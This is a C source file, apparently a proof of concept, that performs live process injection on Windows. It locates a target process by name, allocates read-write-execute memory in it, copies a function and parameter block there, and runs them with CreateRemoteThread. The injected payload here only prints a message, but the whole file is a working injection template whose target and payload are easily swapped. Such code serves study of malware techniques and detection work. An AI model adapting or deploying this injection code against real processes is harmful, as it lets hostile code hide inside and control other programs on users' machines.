/**
 * Created by:          VPR
 * Created:             June 22nd, 2023
 *
 * Updated by:          VPR
 * Updated:             June 23rd, 2023
 *
 * Description          Live process injection using CreateRemoteThread and some  
 *                      simple known lib position tech to create shellcode payloads.
**/

#include <windows.h>
#include <tlhelp32.h>

typedef void* (WINAPI * GetProcAddress_t)(HANDLE, char *);
typedef void* (WINAPI * LoadLibraryA_t)(char *);

typedef struct _Params {
    LoadLibraryA_t fLoadLibraryA;
    GetProcAddress_t fGetProcAddress;
} Params; 

static char* const target = "dummy.exe";

void payload(Params* params)
{
    char szMsvcrt[] = "msvcrt.dll";
    HANDLE hMsvcrtDll = params->fLoadLibraryA(szMsvcrt);
    if (!hMsvcrtDll)
    {
        return;
    }

    char szPuts[] = "puts";
    void (* puts_ptr)(char *) = (void (*)(char *))params->fGetProcAddress(hMsvcrtDll, szPuts);
    if (!puts_ptr)
    {
        return;
    }

    char szMessage[] = "Payload Injected.";
    puts_ptr(szMessage);
}

DWORD GetProcessIdByProcessName(char* restrict process_name)
{
    PROCESSENTRY32 process_entry = { 0 };
    process_entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE processes_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(processes_snapshot, &process_entry))
    {
        do
        {
            if (strcmp(process_entry.szExeFile, process_name) == 0)
            {
                CloseHandle(processes_snapshot);
                return process_entry.th32ProcessID;
            }
        } while (Process32Next(processes_snapshot, &process_entry));
    }

    CloseHandle(processes_snapshot);
    return 0;
}

int main(void)
{
    DWORD process_id = 0;
    if (!(process_id = GetProcessIdByProcessName(target)))
    {
        return 1;
    }

    HANDLE hProcess = NULL;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);
    if (!hProcess)
    {
        return 2;
    }

    Params p = {
        .fLoadLibraryA = (LoadLibraryA_t)(GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA")),
        .fGetProcAddress = (GetProcAddress_t)(GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress"))
    };

    void* params_ptr = VirtualAllocEx(hProcess, NULL, sizeof(p), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!params_ptr)
    {
        CloseHandle(hProcess);
        return 3;
    }

    SIZE_T bytes = 0;
    if (!WriteProcessMemory(hProcess, params_ptr, (LPCVOID)&p, sizeof(p), &bytes) || bytes != sizeof(p))
    {
        VirtualFreeEx(hProcess, params_ptr, sizeof(p), MEM_RELEASE);
        CloseHandle(hProcess);
        return 4;
    }

    uintptr_t payload_size = (uintptr_t)GetProcessIdByProcessName - (uintptr_t)payload;
    void* exec_mem = VirtualAllocEx(hProcess, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem)
    {
        VirtualFreeEx(hProcess, params_ptr, sizeof(p), MEM_RELEASE);
        CloseHandle(hProcess);
        return 6;
    }

    bytes = 0;
    if (!WriteProcessMemory(hProcess, exec_mem, (LPCVOID)payload, payload_size, &bytes) || bytes != payload_size)
    {
        VirtualFreeEx(hProcess, params_ptr, sizeof(p), MEM_RELEASE);
        VirtualFreeEx(hProcess, exec_mem, payload_size, MEM_RELEASE);
        CloseHandle(hProcess);
        return 7;
    }

    HANDLE puts_handle = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, params_ptr, 0, 0);
    if (!puts_handle)
    {
        VirtualFreeEx(hProcess, params_ptr, sizeof(p), MEM_RELEASE);
        VirtualFreeEx(hProcess, exec_mem, payload_size, MEM_RELEASE);
        CloseHandle(hProcess);
        return 8;
    }

    WaitForSingleObjectEx(puts_handle, INFINITE, TRUE);
    VirtualFreeEx(hProcess, params_ptr, sizeof(p), MEM_RELEASE);
    VirtualFreeEx(hProcess, exec_mem, payload_size, MEM_RELEASE);

    CloseHandle(hProcess);
    CloseHandle(puts_handle);

    return 0;
}
